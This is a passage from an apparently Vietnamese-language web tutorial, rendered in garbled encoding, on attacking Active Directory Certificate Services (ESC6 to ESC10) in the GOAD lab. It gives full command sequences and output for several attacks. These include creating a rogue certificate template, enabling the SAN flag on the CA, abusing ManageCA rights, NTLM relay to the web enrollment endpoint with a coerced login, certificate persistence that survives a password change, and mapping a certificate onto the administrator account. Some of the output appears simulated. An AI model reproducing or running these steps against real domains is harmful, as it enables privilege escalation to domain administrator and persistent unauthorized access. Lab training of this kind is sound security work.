[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 12
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">T·∫°o M·∫´u Ch·ª©ng Ch·ªâ</h3>
                    <p>N·∫øu b·∫°n c√≥ GenericWrite tr√™n container M·∫´u Ch·ª©ng ch·ªâ trong GOAD, h√£y t·∫°o m·ªôt m·∫´u d·ªÖ b·ªã t·ªïn th∆∞∆°ng m·ªõi:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$templateDN = "CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"

# Template with dangerous settings for GOAD environment
New-ADObject -Name "EvilTemplate" -Type "pKICertificateTemplate" -Path "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -OtherAttributes @{
    'flags' = 131680
    'msPKI-Certificate-Name-Flag' = 1
    'msPKI-Enrollment-Flag' = 41
    'msPKI-Minimal-Key-Size' = 2048
    'msPKI-Private-Key-Flag' = 16842752
    'msPKI-Template-Schema-Version' = 2
    'pKIDefaultKeySpec' = 1
    'pKIExpirationPeriod' = ([byte[]](0x00,0x40,0x1E,0xA4,0xE8,0x65,0xFA,0xFF))
    'pKIExtendedKeyUsage' = @('1.3.6.1.5.5.7.3.2')
    'pKIKeyUsage' = ([byte[]](0x80,0x00))
    'pKIOverlapPeriod' = ([byte[]](0x00,0x80,0xA6,0x0A,0xFF,0xDE,0xFF,0xFF))
    'revision' = 100
}

ObjectGUID                : 8f3e2a1b-9c4d-4e5f-a6b7-c8d9e0f1a2b3
DistinguishedName         : CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
Name                      : EvilTemplate
ObjectClass               : pKICertificateTemplate

# Template created successfully and ready for exploitation
</code></pre>
                    </div>
                </section>

                <!-- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC6: Khai Th√°c C√†i ƒê·∫∑t EDITF_ATTRIBUTESUBJECTALTNAME2</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>
                        ESC6 khai th√°c Flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>
                        tr√™n CA, cho ph√©p ch·ªâ ƒë·ªãnh SAN trong b·∫•t k·ª≥ y√™u c·∫ßu ch·ª©ng ch·ªâ n√†o.
                    </p>
                    
                    <p>
                        <em>
                            ƒê·ªÉ bi·∫øt th√¥ng tin chi ti·∫øt v·ªÅ l·ªó h·ªïng n√†y v√† c√°c b∆∞·ªõc kh·∫Øc ph·ª•c, h√£y xem b√†i vi·∫øt tr√™n Microsoft Learn v·ªÅ <a href="https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting">"Ch·ªânh s·ª≠a c√†i ƒë·∫∑t CA d·ªÖ b·ªã t·ªïn th∆∞∆°ng (ESC6)"</a>
                        </em>
                    </p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Ki·ªÉm Tra L·ªó H·ªïng</h3>
                    <p>H√£y ki·ªÉm tra c·∫•u h√¨nh CA trong GOAD. Ki·ªÉm tra xem Flag n√†y c√≥ ƒë∆∞·ª£c thi·∫øt l·∫≠p tr√™n ESSOS-CA hay kh√¥ng:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags REG_DWORD = 0x144120 (1327392)

EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
EDITF_ATTRIBUTEENDDATE -- 20000 (131072)
EDITF_ATTRIBUTECA -- 4000 (16384)
EDITF_IGNOREREQUESTERGROUP -- 100000 (1048576)
CertUtil: -getreg command completed successfully.

# Flag 0x40000 (EDITF_ATTRIBUTESUBJECTALTNAME2) is present!
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Khai Th√°c</h3>
                    <p>
                        <strong>L∆∞u √Ω:</strong>
                        K·ªÉ t·ª´ b·∫£n v√° c·ªßa Microsoft trong KB5014754 (ng√†y 10 th√°ng 5 nƒÉm 2022), c√°c ch·ª©ng ch·ªâ ƒë∆∞·ª£c ph√°t h√†nh th√¥ng qua m·ªôt CA v·∫´n c√≥ Flag EDITF_ATTRIBUTESUBJECTALTNAME2 ƒë∆∞·ª£c thi·∫øt l·∫≠p ph·∫£i ch·ª©a ph·∫ßn m·ªü r·ªông SID m·ªõi ho·∫∑c d·ª±a v√†o c√°c ch·∫ø ƒë·ªô √°nh x·∫° y·∫øu; n·∫øu kh√¥ng, vi·ªác ƒëƒÉng nh·∫≠p s·∫Ω b·ªã t·ª´ ch·ªëi. Do ƒë√≥, vi·ªác khai th√°c ESC6 th∆∞·ªùng y√™u c·∫ßu c√°c ƒëi·ªÅu ki·ªán ESC9 ho·∫∑c ESC10.
                    </p>
                    
                    <p>T√¨m c√°c CA c√≥ Flag EDITF_ATTRIBUTESUBJECTALTNAME2 ƒë∆∞·ª£c thi·∫øt l·∫≠p:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :
[!] Certificate Authority has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set!

    Enterprise CA Name            : ESSOS-CA
    DNS Hostname                  : braavos.essos.local
    FullName                      : braavos.essos.local\ESSOS-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ESSOS-CA, DC=essos, DC=local
    UserSpecifiedSAN              : Enabled (ESC6)
</code></pre>
                    
                    <p>Y√™u c·∫ßu ch·ª©ng ch·ªâ v·ªõi SAN t√πy √Ω b·∫±ng c√°ch s·ª≠ d·ª•ng b·∫•t k·ª≥ m·∫´u n√†o:</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : User
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 13
</code></pre>
                    
                    <p>M·∫∑c d√π m·∫´u kh√¥ng cho ph√©p ch·ªâ ƒë·ªãnh ch·ªß th·ªÉ,
ESC6 cho ph√©p ƒëi·ªÅu n√†y th√¥ng qua c·∫•u h√¨nh CA</p>
                    <h3 class="text-xl text-green-400 font-semibold mb-4">B·∫≠t Flag (n·∫øu b·∫°n c√≥ quy·ªÅn qu·∫£n tr·ªã CA). B·∫≠t Flag nguy hi·ªÉm tr√™n GOAD CA:</h3>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

CertUtil: -setreg command completed successfully.
</code></pre>
                    
                    <p>Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª• ch·ª©ng ch·ªâ:</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Restart-Service CertSvc

WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...
WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...

Status   Name               DisplayName
------   ----               -----------
Running  CertSvc            Active Directory Certificate Services
</code></pre>
                </section>

                <!-- ESC7: Vulnerable Certificate Authority Access Control -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC7: Khai Th√°c Quy·ªÅn Truy C·∫≠p v√†o CA</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC7 ho√†n to√†n li√™n quan ƒë·∫øn vi·ªác c√≥ ƒë∆∞·ª£c quy·ªÅn truy c·∫≠p tr·ª±c ti·∫øp v√†o CA. N·∫øu b·∫°n c√≥ quy·ªÅn ManageCA ho·∫∑c ManageCertificates, b·∫°n g·∫ßn nh∆∞ s·ªü h·ªØu to√†n b·ªô h·∫° t·∫ßng ch·ª©ng ch·ªâ.</p>
                    
                    <p>H√£y xem ch√∫ng ta c√≥ quy·ªÅn g√¨ trong GOAD. Ki·ªÉm tra xem ch√∫ng ta c√≥ quy·ªÅn ManageCA hay kh√¥ng:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Permissions
      Owner                       : BUILTIN\Administrators        Access: GenericAll
      Access Rights               : ESSOS\Domain Admins           Access: GenericAll
      Access Rights               : ESSOS\Enterprise Admins       Access: GenericAll
      Access Rights               : ESSOS\viserys.targaryen       Access: ManageCA
      Access Rights               : ESSOS\viserys.targaryen       Access: ManageCertificates
</code></pre>
                    
                    <p>
                        Ho√†n h·∫£o! <code>viserys.targaryen</code>
                        c√≥ quy·ªÅn ManageCA v√† ManageCertificates trong GOAD.
                    </p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Khai Th√°c Quy·ªÅn ManageCA</h3>
                    <p>Quy·ªÅn ManageCA gi·ªëng nh∆∞ c√≥ ch√¨a kh√≥a cho v∆∞∆°ng qu·ªëc. D∆∞·ªõi ƒë√¢y l√† nh·ªØng g√¨ b·∫°n c√≥ th·ªÉ l√†m:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># N·∫øu b·∫°n c√≥ ManageCA, b·∫°n c√≥ th·ªÉ:
# 1. B·∫≠t Flag EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

CertUtil: -setreg command completed successfully.

# 2. Quy·ªÅn qu·∫£n l√Ω ch·ª©ng ch·ªâ
# Nh∆∞ ƒë·∫ßu ra c·ªßa Certify ƒë√£ ch·ªâ ra, viserys.targaryen ƒë√£ s·ªü h·ªØu quy·ªÅn ManageCA v√† ManageCertificates trong k·ªãch b·∫£n GOAD c·ªßa ch√∫ng ta.
# M·ªôt k·∫ª t·∫•n c√¥ng c√≥ ƒë∆∞·ª£c nh·ªØng quy·ªÅn n√†y th∆∞·ªùng s·∫Ω l√†m nh∆∞ v·∫≠y b·∫±ng c√°ch x√¢m nh·∫≠p v√†o m·ªôt t√†i kho·∫£n ƒë√£ c√≥ quy·ªÅn ho·∫∑c b·∫±ng c√°ch n√¢ng c·∫•p l√™n m·ªôt c·∫•p ƒë·ªô
# m√† h·ªç c√≥ th·ªÉ s·ª≠a ƒë·ªïi quy·ªÅn ƒë·ªëi t∆∞·ª£ng Active Directory c·ªßa CA ho·∫∑c nh√≥m c·ª•c b·ªô tr√™n m√°y ch·ªß CA.
# V·ªõi quy·ªÅn ManageCA, ng∆∞·ªùi ta c√≥ th·ªÉ g√°n quy·ªÅn qu·∫£n l√Ω (ManageCertificates) th√¥ng qua console D·ªãch v·ª• Ch·ª©ng ch·ªâ (certsrv.msc).

# 3. Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª• ƒë·ªÉ √°p d·ª•ng thay ƒë·ªïi
Restart-Service CertSvc

WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...
WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...

Status   Name               DisplayName
------   ----               -----------
Running  CertSvc            Active Directory Certificate Services
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Khai Th√°c Quy·ªÅn ManageCertificates</h3>
                    <p>V·ªõi quy·ªÅn ManageCertificates, ph√™ duy·ªát c√°c y√™u c·∫ßu ƒëang ch·ªù. ƒê·∫ßu ti√™n, g·ª≠i m·ªôt y√™u c·∫ßu cho ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn b·∫±ng c√°ch s·ª≠ d·ª•ng m·∫´u SubCA:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:SubCA /altname:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\viserys.targaryen
[*] Template                : SubCA
[*] Subject                 : CN=viserys.targaryen, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : Taken Under Submission
[*] Request ID              : 14

# The request is pending, now approve it with ManageCertificates permission
certutil -config "braavos.essos.local\ESSOS-CA" -approve 14

# Expected output:
# Request 14 approved.
# CertUtil: -approve command completed successfully.

# Retrieve the issued certificate
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /retrieve 14

[*] Action: Retrieve Certificates
[*] Request ID: 14
[*] Certificate retrieved successfully
</code></pre>
</div>
                </section>

                <!-- ESC8: NTLM Relay to AD CS HTTP Endpoints -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC8: T·∫•n C√¥ng NTLM Relay ƒë·∫øn C√°c ƒêi·ªÉm Cu·ªëi HTTP c·ªßa AD CS</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC8 l√† n∆°i m·ªçi th·ª© tr·ªü n√™n th·ª±c s·ª± th√∫ v·ªã. N√≥ k·∫øt h·ª£p ADCS v·ªõi c√°c cu·ªôc t·∫•n c√¥ng NTLM relay, nh·∫Øm m·ª•c ti√™u v√†o c√°c ƒëi·ªÉm cu·ªëi ƒëƒÉng k√Ω ch·ª©ng ch·ªâ d·ª±a tr√™n HTTP. T√¥i r·∫•t th√≠ch k·ªπ thu·∫≠t n√†y v√¨ n√≥ t·∫≠n d·ª•ng hai Vector t·∫•n c√¥ng kh√°c nhau c√πng m·ªôt l√∫c.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">ƒêi·ªÅu Ki·ªán Ti√™n Quy·∫øt</h3>
                    <p>Trong GOAD, ch√∫ng ta c√≥ c√°c ƒëi·ªÅu ki·ªán ho√†n h·∫£o cho ESC8:</p>
                    
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>
                            ƒêƒÉng k√Ω web ADCS <strong>ƒë∆∞·ª£c b·∫≠t</strong>
                        </li>
                        <li>
                            <strong>ƒêi·ªÉm cu·ªëi ƒëƒÉng k√Ω HTTP</strong>
                            c√≥ th·ªÉ truy c·∫≠p t·∫°i <code>http://braavos.essos.local/certsrv/</code>
                        </li>
                        <li>
                            Ch√∫ng ta c√≥ th·ªÉ th·ª±c hi·ªán c√°c cu·ªôc t·∫•n c√¥ng <strong>NTLM relay</strong>
                        </li>
                    </ul>
                    
                    <p>NTLM relay ho·∫°t ƒë·ªông ch·ªëng l·∫°i c·∫£ trang ƒëƒÉng k√Ω HTTP v√† HTTPS; giao th·ª©c √≠t quan tr·ªçng h∆°n so v·ªõi vi·ªác c√°c token b·∫£o v·ªá k√™nh (EPA) ho·∫∑c token b·∫£o v·ªá k√™nh c√≥ ƒë∆∞·ª£c y√™u c·∫ßu hay kh√¥ng. B·∫≠t EPA v√† y√™u c·∫ßu SSL ƒë·ªÉ ph√° v·ª° cu·ªôc t·∫•n c√¥ng relay.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Tri·ªÉn Khai T·∫•n C√¥ng</h3>
                    <p>H√£y ki·ªÉm tra ƒëi·ªÉm cu·ªëi ƒëƒÉng k√Ω web tr∆∞·ªõc:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Check if ADCS web enrollment is accessible
curl -I http://braavos.essos.local/certsrv/certfnsh.asp

HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
Date: Thu, 03 Jan 2025 16:45:12 GMT
</code></pre>
                    
                    <p>Tuy·ªát v·ªùi! N√≥ ƒëang y√™u c·∫ßu x√°c th·ª±c NTLM. B√¢y gi·ªù h√£y thi·∫øt l·∫≠p cu·ªôc t·∫•n c√¥ng relay:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Set up NTLM relay to ADCS HTTP endpoint
python3 ntlmrelayx.py -t http://braavos.essos.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template "DomainController"

Impacket v0.11.0 - Copyright 2023 Fortra
Note: Output may vary slightly between versions - banners truncated for brevity

[*] Protocol Client DCOM loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

# In another terminal, trigger authentication from target DC
python3 printerbug.py essos.local/missandei:fr3edom@meereen.essos.local braavos.essos.local

[*] Impacket v0.11.0 - Copyright 2023 Fortra
[*] Attempting to trigger authentication via rprn RPC at meereen.essos.local
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked

# Back in ntlmrelayx window:
[*] SMBD-Thread-4: Connection from MEEREEN/192.168.56.12 controlled, attacking target http://braavos.essos.local
HTTP        : success, Cert saved to /tmp/MEEREEN$cert.b64
[*] ADCS attack completed. Generated certificate for user MEEREEN$

# Certificate successfully obtained!
</code></pre>
                    
                    <p>H√£y chuy·ªÉn ƒë·ªïi v√† s·ª≠ d·ª•ng ch·ª©ng ch·ªâ:</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Convert base64 certificate for use
cat /tmp/MEEREEN$cert.b64 | base64 -d > meereen.pfx

# Ask for a TGT with the machine certificate
gettgtpkinit.py essos.local/meereen$ -pfx-file meereen.pfx meereen.ccache

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache file meereen.ccache
[*] Requesting TGT for meereen$@essos.local using Kerberos PKINIT
[+] TGT request successful!
[*] Saved TGT to meereen.ccache

# Use machine certificate for further attacks or DCSync
</code></pre>
</div>
                </section>

                <!-- ESC9: No Security Extension -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC9: Khai Th√°c Thi·∫øu Ph·∫ßn M·ªü R·ªông B·∫£o M·∫≠t</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC9 l√† m·ªôt c∆° h·ªôi tuy·ªát v·ªùi cho vi·ªác duy tr√¨ quy·ªÅn truy c·∫≠p. N√≥ khai th√°c c√°c m·∫´u ch·ª©ng ch·ªâ kh√¥ng y√™u c·∫ßu ph·∫ßn m·ªü r·ªông b·∫£o m·∫≠t szOID_NTDS_CA_SECURITY_EXT trong c√°c ch·ª©ng ch·ªâ ƒë∆∞·ª£c ph√°t h√†nh. ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† c√°c ch·ª©ng ch·ªâ c·ªßa b·∫°n v·∫´n ho·∫°t ƒë·ªông ngay c·∫£ khi m·∫≠t kh·∫©u thay ƒë·ªïi.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Chi Ti·∫øt Vulnerability</h3>
                    <p>Khi c√°c ch·ª©ng ch·ªâ thi·∫øu ph·∫ßn m·ªü r·ªông b·∫£o m·∫≠t, ch√∫ng cung c·∫•p x√°c th·ª±c b·ªÅn b·ªâ t·ªìn t·∫°i qua c√°c thay ƒë·ªïi m·∫≠t kh·∫©u. Ch√≠nh ƒëi·ªÅu n√†y l√†m cho ch√∫ng tr·ªü n√™n ho√†n h·∫£o ƒë·ªÉ duy tr√¨ quy·ªÅn truy c·∫≠p l√¢u d√†i.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">ƒêi·ªÉm Ch√≠nh</h3>
                    <p>
                        M·ªôt ch·ª©ng ch·ªâ ƒë∆∞·ª£c ph√°t h√†nh t·ª´ m·ªôt m·∫´u <code>NO_SECURITY_EXTENSION</code>
                        s·∫Ω v·∫´n ƒë∆∞·ª£c √°nh x·∫° ngay c·∫£ sau khi ng∆∞·ªùi d√πng thay ƒë·ªïi m·∫≠t kh·∫©u, l√†m cho n√≥ tr·ªü n√™n ho√†n h·∫£o cho vi·ªác duy tr√¨ quy·ªÅn truy c·∫≠p.
                    </p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Quy Tr√¨nh Khai Th√°c</h3>
                    <p>H√£y ki·ªÉm tra ƒëi·ªÅu n√†y trong m√¥i tr∆∞·ªùng GOAD c·ªßa ch√∫ng ta:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Find templates without security extension requirement
Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC9
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : 0x0
    mspki-enrollment-flag         : NO_SECURITY_EXTENSION, INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow

# Request certificate for current user (missandei)
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC9

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : ESC9
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 15

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
...certificate without security extension...
-----END CERTIFICATE-----

# Test authentication with current certificate

Rubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!

# Now change the user's password
net user missandei "NewComplexPassword123!" /domain

The command completed successfully.

# Certificate still works for authentication even after password change!

Rubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!

  UserName                 : missandei
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025  5:30:45 PM
  EndTime                  : 1/4/2025 3:30:45 AM
  RenewTill                : 1/10/2025 5:30:45 PM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable

# Perfect persistence! The certificate still authenticates despite password change
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Ph√¢n T√≠ch M·∫´u</h3>
                    <p>Ki·ªÉm tra xem m·∫´u c√≥ y√™u c·∫ßu ph·∫ßn m·ªü r·ªông b·∫£o m·∫≠t trong GOAD:</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$templateDN = "CN=ESC9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
$template = Get-ADObject -Identity $templateDN -Properties msPKI-Enrollment-Flag

# The CT_FLAG_NO_SECURITY_EXTENSION flag value is 0x80000 (524288)
$NoSecurityExtensionFlag = 0x80000

if ($template.'msPKI-Enrollment-Flag' -band $NoSecurityExtensionFlag) {
    Write-Host "Template '$($template.Name)' has the NO_SECURITY_EXTENSION flag set."
} else {
    Write-Host "Template '$($template.Name)' does NOT have the NO_SECURITY_EXTENSION flag set."
}

# Output shows template has NO_SECURITY_EXTENSION flag set - perfect for persistence!
</code></pre>
</div>
                </section>

                <!-- ESC10: Weak Certificate Mappings -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC10: Khai Th√°c √Ånh X·∫° Ch·ª©ng Ch·ªâ Y·∫øu</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC10 khai th√°c c√°c c·∫•u h√¨nh √°nh x·∫° ch·ª©ng ch·ªâ ƒë·∫øn t√†i kho·∫£n y·∫øu v√† c√°c l·ªó h·ªïng √°nh x·∫° ch·ª©ng ch·ªâ.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Vector T·∫•n C√¥ng</h3>
                    <p>
                        <strong>ESC10A - Quy·ªÅn Ghi tr√™n altSecurityIdentities:</strong>
                    </p>
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>
                            Nh·ªØng k·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn ghi tr√™n c√°c ƒë·ªëi t∆∞·ª£ng ng∆∞·ªùi d√πng c√≥ th·ªÉ s·ª≠a ƒë·ªïi <code>altSecurityIdentities</code>
                        </li>
                        <li>Thu·ªôc t√≠nh n√†y √°nh x·∫° c√°c ch·ª©ng ch·ªâ ƒë·∫øn t√†i kho·∫£n ng∆∞·ªùi d√πng</li>
                        <li>√Ånh x·∫° ƒë·ªôc h·∫°i cho ph√©p x√°c th·ª±c d·ª±a tr√™n ch·ª©ng ch·ªâ nh∆∞ c√°c ng∆∞·ªùi d√πng kh√°c</li>
                    </ul>
                    
                    <p>
                        <strong>ESC10B - Ph∆∞∆°ng Ph√°p √Ånh X·∫° Ch·ª©ng Ch·ªâ Y·∫øu:</strong>
                    </p>
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>
                            Khai th√°c c√°c c√†i ƒë·∫∑t ƒëƒÉng k√Ω <code>CertificateMappingMethods</code>
                            y·∫øu
                        </li>
                        <li>Cho ph√©p x√°c th·ª±c ch·ª©ng ch·ªâ v·ªõi c√°c tham s·ªë ch·ªß th·ªÉ m·ªôt ph·∫ßn</li>
                    </ul>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">V√≠ D·ª• Khai Th√°c</h3>
                    <p>H√£y th·ª≠ ESC10A trong GOAD:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># ESC10A - Modify altSecurityIdentities attribute
# First, create a computer account and request machine certificate
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123!' essos/missandei:fr3edom@meereen.essos.local

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account EVIL$ with password Password123!.

# Request machine certificate for our new computer
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:Machine /machine

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\EVIL$
[*] Template                : Machine
[*] Subject                 : CN=EVIL, CN=Computers, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 18

# Extract certificate details (issuer, serial number)
certutil -dump evil.pem

Certificate:
    Serial Number: 6100000028f9b2d3c5a1b4e87a00000000000028
    Issuer: CN=ESSOS-CA, DC=essos, DC=local
    Subject: CN=EVIL, CN=Computers, DC=essos, DC=local

# Modify target user's altSecurityIdentities to map to our certificate
$dn = "CN=administrator,CN=Users,DC=essos,DC=local"
$mapping = "X509:&#x3C;I>CN=ESSOS-CA,DC=essos,DC=local &#x3C;S>6100000028f9b2d3c5a1b4e87a00000000000028"
Set-ADObject -Identity $dn -Replace @{'altSecurityIdentities' = $mapping}

# Authenticate as administrator using our EVIL$ machine certificate

Rubeus.exe asktgt /user:administrator /certificate:evil.pfx /password:Password123!

[*] Action: Ask TGT
[*] Using certificate mapping via altSecurityIdentities
[*] Using PKINIT with etype rc4_hmac and subject: CN=EVIL, CN=Computers, DC=essos, DC=local
[+] TGT request successful!

  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 6:45:12 PM
  EndTime                  : 1/4/2025 4:45:12 AM
  RenewTill                : 1/10/2025 6:45:12 PM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
</code></pre>
                    
                    <p>
                        Ho√†n h·∫£o! Ch√∫ng t√¥i ƒë√£ th√†nh c√¥ng trong vi·ªác x√°c th·ª±c l√† qu·∫£n tr·ªã vi√™n b·∫±ng c√°ch s·ª≠ d·ª•ng ch·ª©ng ch·ªâ m√°y EVIL$ ƒë∆∞·ª£c √°nh x·∫° qua <code>altSecurityIdentities</code>
                        .
                    </p>
                    </div>
                </section>

